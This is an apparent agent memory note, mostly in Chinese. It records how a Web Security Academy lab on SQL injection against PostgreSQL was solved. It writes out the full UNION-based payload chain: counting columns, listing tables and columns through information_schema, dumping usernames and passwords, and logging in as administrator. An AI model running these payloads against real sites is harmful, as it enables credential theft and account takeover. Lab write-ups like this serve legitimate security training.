---
metadata:
  node_type: memory
name: "PRS arm A lab-listing-database-contents-non-oracle"
description: "arm A:lab-listing-database-contents-non-oracle 冷实例一次通过 - PostgreSQL information_schema 查表/列/凭据后登录 administrator"
last_updated: 2026-10-09T05:23:44+08:00
created: 2026-10-09T05:23:44+08:00
---

## 2026-10-09 arm A 基线

lab: SQL injection attack, listing the database contents on non-Oracle databases
实例: https://0a30007603e3d5a9813a703f00e700a5.web-security-academy.net/ (range_launch launch-url, reused:false)

链(全部走件):
1. `raw_matrix` 面盘判列数: /filter?category=Gifts' UNION SELECT NULL[,×n]-- ; 2 列时 200(bytes 8727 vs 基线 8645),1/3/4 列 500。
2. `raw_matrix` 查表: category=zzz' UNION SELECT table_name,table_name FROM information_schema.tables-- → users_dhqigi(库为 PostgreSQL,旁证 pg_* 表成片)。
3. `raw_matrix` 查列: ... FROM information_schema.columns WHERE table_name='users_dhqigi'-- → username_qtoxtc / password_peoyqn(另有 email)。
4. `raw_matrix` 取凭据: UNION SELECT username_qtoxtc,password_peoyqn FROM users_dhqigi-- → administrator / 9lbi6rh4tixx65rllgah(明文;wiener/carlos 同行)。
5. `http_session` get /login + `html_text --tag input --attr value` 取 csrf;post /login 三字段 → 302 /my-account?id=administrator,新 session 写回 jar。
6. 判定: /my-account 与 / 均含 `class='academyLabBanner is-solved'` + "Congratulations, you solved the lab!"。

坑:
- 用 `category=zzz'`(不存在的分类)叠加 UNION,基线产品行清零,注入行直接落进表格,免翻长页面。
- raw_matrix 不回显整页,靠 spec 的 `snippet` 抬高(20000)即可读到注入行;body 无 length 限制。
- `banner_verdict` 对本题根页误判 solved:false / congrats_line:null —— 页横幅用单引号 `class='academyLabBanner is-solved'`,该件疑似只认双引号形态(件缺陷候选);判定改用 http_session 存页 + text_grep `is-solved`。

